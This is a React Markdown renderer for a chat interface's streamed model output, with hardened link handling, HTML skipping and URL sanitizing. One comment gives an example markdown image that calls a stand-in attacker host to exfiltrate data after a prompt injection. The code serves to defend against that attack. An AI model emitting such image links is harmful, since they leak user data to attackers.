"use client";

import { memo, useMemo } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { closeOpenFence, splitMarkdownBlocks } from "../markdown-blocks";
import { safeUrl } from "../safe-url";
import { CodeBlock } from "./code-block";

const components: Components = {
  a: ({ href, children }) => (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer nofollow"
      className="underline underline-offset-2 hover:no-underline"
    >
      {children}
    </a>
  ),
  // Remote images are NOT loaded. A model that was tricked by a prompt injection could emit
  // ![x](https://evil.example/?data=...) and the browser would send that data to the attacker.
  img: ({ alt }) => (
    <span className="italic text-muted-foreground">
      [image{alt ? `: ${alt}` : ""} not shown]
    </span>
  ),
  pre: ({ children }) => <>{children}</>, // CodeBlock draws its own frame
  code: ({ className, children }) => {
    const language = /language-([\w-]+)/.exec(className ?? "")?.[1];
    const text = String(children).replace(/\n$/, "");
    if (!language && !text.includes("\n")) {
      return (
        <code className="rounded bg-muted px-1 py-0.5 font-mono text-[0.9em]">
          {children}
        </code>
      );
    }
    return <CodeBlock code={text} language={language} />;
  },
  p: ({ children }) => <p className="my-3 leading-7 first:mt-0 last:mb-0">{children}</p>,
  ul: ({ children }) => <ul className="my-3 list-disc space-y-1 pl-6">{children}</ul>,
  ol: ({ children }) => <ol className="my-3 list-decimal space-y-1 pl-6">{children}</ol>,
  h1: ({ children }) => <h1 className="mb-2 mt-5 text-xl font-semibold">{children}</h1>,
  h2: ({ children }) => <h2 className="mb-2 mt-5 text-lg font-semibold">{children}</h2>,
  h3: ({ children }) => <h3 className="mb-1 mt-4 font-semibold">{children}</h3>,
  blockquote: ({ children }) => (
    <blockquote className="my-3 border-l-4 pl-4 text-muted-foreground">{children}</blockquote>
  ),
  table: ({ children }) => (
    <div className="my-3 overflow-x-auto">
      <table className="w-full border-collapse text-sm">{children}</table>
    </div>
  ),
  th: ({ children }) => (
    <th className="border px-3 py-1.5 text-left font-semibold">{children}</th>
  ),
  td: ({ children }) => <td className="border px-3 py-1.5">{children}</td>,
};

// Memoized by its text: a finished block is never rendered again.
const MarkdownBlock = memo(function MarkdownBlock({ text }: { text: string }) {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      components={components}
      urlTransform={safeUrl}
      skipHtml
    >
      {text}
    </ReactMarkdown>
  );
});

export function Markdown({ text, streaming = false }: { text: string; streaming?: boolean }) {
  const blocks = useMemo(() => splitMarkdownBlocks(text), [text]);
  return (
    <div className="break-words">
      {blocks.map((block, index) => {
        const active = streaming && index === blocks.length - 1;
        // While streaming, an unfinished code fence is closed so it shows as code, not noise.
        return <MarkdownBlock key={index} text={active ? closeOpenFence(block) : block} />;
      })}
    </div>
  );
}
